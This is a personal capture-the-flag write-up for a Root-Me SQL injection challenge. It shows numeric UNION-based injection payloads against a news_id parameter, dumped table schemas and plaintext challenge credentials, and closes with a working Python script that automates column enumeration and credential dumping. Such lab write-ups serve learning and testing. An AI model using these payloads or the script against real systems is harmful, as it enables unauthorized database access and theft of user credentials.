[[SQLi]] [[root-me]]
#completed 
# FIRST LOOK
There are three different buttons on the home page, leading me to a page that has a URL Query Parameter, changing from 1 to 3, and then there was a login button in the home page. I clicked it remembering that maybe it has a verbose error message again that way i can exfiltrate data from there. Inputted `' OR 1=1 --` but it did not show any error message. This will not tell me the data i need, which is the administrator password. It may be a blind SQLi, but lets explore other vectors first.

# BACK-END LOGIC
The news page is a page that uses URL Query Parameter, the application utilizes a GET parameter (news_id) to fetch content. This presents a high-risk injection vector if the input is not passed through strict server validation. action=news pointing it to the news before specifying what id is this news being displayed in the page. There is no form in the page, but we can exploit the parameter in the URL which would be the news_id. Maybe the back end logic looks like this `SELECT ... FROM ... WHERE id = $user-input`. I also think that the website is using a fail-safe that stops ' ' from being read by the server, because when i use `-1 '  OR 1=1 --` it says that there is an unrecognized token which is `\`. After research, it says that there is a function called addslashes(). This is a PHP function that stops ' and appends a \ before characters that need to be escaped. Mostly used for ' ' " ". So this points us to use the news_id parameter which is a numeric-based injection unlike login forms that uses string-based injection. 

# EXPLOIT
First map out how many tables there are by using `ORDER BY x`, to determine the number of columns required for a UNION attack, I used an enumeration technique that uses `ORDER BY` clause. This identifies the 'boundary' of the internal query. But if you use `ORDER BY 4` This will return an error message saying that `1st ORDER BY term out of range - should be between 1 and 3`, this is because there is only 3 columns and the database is telling us that 4 will not work. Now we know how many columns it says there are three columns. Now we can use `UNION` to query the database to what tables it contains, we can use `news_id=-1 UNION SELECT 1, 2, 3` and this will output which variables are being shown. The page now reads

```
News
2
3
```

This tells us that the union select outputs 2 and 3, but does not show 1. By knowing this we can think that the PHP logic looks like this.

```
$row = $db->query("SELECT col1, col2, col3 FROM news WHERE id = $id");
echo "<h1>" . $row['col2'] . "</h1>"; // This is where the '2' appeared
echo "<p>" . $row['col3'] . "</p>";   // This is where the '3' appeared
```

Based on the error message of the news_id where we tried to use `'`  but was blocked, it shows that the database being used was SQLite. SQLite has a sqlite_master table, this table contains 5 columns. We can use this table to find out the structure of the database.

| type                  | name               | tbl_name          | rootpage                  | sql                    |
| --------------------- | ------------------ | ----------------- | ------------------------- | ---------------------- |
| table, index, trigger | name of the object | name of the table | internal database pointer | CREATE TABLE statement |

We can use sql with the union select to know what are the tables. `news_id=-1 UNION SELECT 1, sql, tbl_name FROM sqlite_master`

```
News
CREATE TABLE news(id INTEGER, title TEXT, description TEXT) 
news
CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)
users
```

There are two tables, news and users. Based from the needed requirements we need to get the users details. There are three columns on the users table, but we only need the username and password, but we can also output the whole table by using `news_id=-1 UNION SELECT 1, username, password FROM users`. With this query, we get the rows of users table which contains the username and password.

```
News
admin
aTlkJYLjcbLmue3

user1
vUrpgAsCTX

user2
aFjRKx7j9d
```

# AUTOMATION
I like building automated minecraft farms, here is an automated bare bones automated python script.

```
import requests
import re
from bs4 import BeautifulSoup  # Added for proper HTML parsing

# 1. Configuration
URL = "http://challenge01.root-me.org/web-serveur/ch18/"
# We use a unique marker so the script knows where the injected data starts
MARKER = "---DATA---"

def get_response(payload):
    # The 'action=news' part is from your writeup
    params = {'action': 'news', 'news_id': payload}
    try:
        response = requests.get(URL, params=params, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"[-] Error fetching response for payload '{payload}': {e}")
        return ""

# 2. Find Column Count (The 'ORDER BY' Logic)
print("[*] Enumerating column count...")
col_count = 0
for i in range(1, 20):  # Increased range to be safe
    payload = f"1 ORDER BY {i} --"
    print(f"[*] Testing payload: {payload}")
    response = get_response(payload)
    if "term out of range" in response.lower() or "unknown column" in response.lower():
        col_count = i - 1
        print(f"[+] Found {col_count} columns.")
        break
else:
    print("[-] Could not determine column count. Assuming 3 for this challenge.")
    col_count = 3

if col_count == 0:
    print("[-] Column count detection failed. Exiting.")
    exit(1)

# 3. Find Reflection (Which columns show on screen?) - Single request
print(f"[*] Identifying reflection points with {col_count} columns...")
test_vals = [str(999 + i) for i in range(1, col_count + 1)]
payload = f"-1 UNION SELECT {','.join(test_vals)} --"
print(f"[*] Testing reflection with payload: {payload}")
response = get_response(payload)
reflected_cols = []
for i, test_val in enumerate(test_vals, 1):
    if test_val in response:
        reflected_cols.append(i)
        print(f"[+] Column {i} is visible.")

if not reflected_cols:
    print("[-] Failed to find reflected columns.")
    exit(1)

print(f"[+] Reflected columns: {reflected_cols}")

# 4. Data Exfiltration (The Dump)
print(f"[+] System is stable. Starting clean exfiltration...")

# Helper function to extract data from response
def extract_injected_data(response):
    if '<h3>News</h3>' in response:
        start = response.find('<h3>News</h3>') + len('<h3>News</h3>')
        # Find the end, perhaps until </body>
        end = response.find('</body>', start)
        if end == -1:
            end = len(response)
        section = response[start:end]
        # Use soup to get all text
        soup = BeautifulSoup(section, 'html.parser')
        texts = soup.get_text().strip().split('\n')
        return [t.strip() for t in texts if t.strip()]
    return []

# Get table info from sqlite_master
print("[*] Fetching table information...")
cols = ["NULL"] * col_count
if 2 in reflected_cols:
    cols[1] = "sql"
if 3 in reflected_cols:
    cols[2] = "tbl_name"
payload = f"-1 UNION SELECT {','.join(cols)} FROM sqlite_master --"
print(f"[*] Table info payload: {payload}")
table_raw = get_response(payload)
table_data = extract_injected_data(table_raw)
print(f"[+] Extracted table info: {table_data}")

# Check for users table
table_text = ' '.join(table_data)
if 'users' in table_text.lower():
    print("[*] Users table found. Fetching credentials...")
    
    # Select all rows from users
    cols = ["NULL"] * col_count
    if 2 in reflected_cols:
        cols[1] = "username"
    if 3 in reflected_cols:
        cols[2] = "password"
    payload = f"-1 UNION SELECT {','.join(cols)} FROM users --"
    print(f"[*] Credentials payload: {payload}")
    cred_raw = get_response(payload)
    
    # Parse credentials using BeautifulSoup
    soup = BeautifulSoup(cred_raw, 'html.parser')
    news_h3 = soup.find('h3', string='News')
    if news_h3:
        b_tags = news_h3.find_all_next('b')
        p_tags = news_h3.find_all_next('p')
        usernames = [b.get_text().strip() for b in b_tags]
        passwords = [p.get_text().strip() for p in p_tags]
        
        # Display results
        print("\n" + "="*50)
        print("      DUMPED CREDENTIALS")
        print("="*50)
        
        if len(usernames) == len(passwords):
            for user, pwd in zip(usernames, passwords):
                print(f"User: {user}, Password: {pwd}")
        else:
            print("[-] Mismatch in number of usernames and passwords.")
            print(f"Usernames: {usernames}")
            print(f"Passwords: {passwords}")
    else:
        print("[-] Could not find News header in credentials response.")
        print(f"Raw response snippet: {cred_raw[cred_raw.find('<h3>News</h3>'):cred_raw.find('<h3>News</h3>')+500] if '<h3>News</h3>' in cred_raw else cred_raw[200:400].strip()}")
else:
    print("[-] Users table not found.")
    print(f"Raw table response snippet: {table_raw[table_raw.find('<h3>News</h3>'):table_raw.find('<h3>News</h3>')+500] if '<h3>News</h3>' in table_raw else table_raw[200:400].strip()}")
```
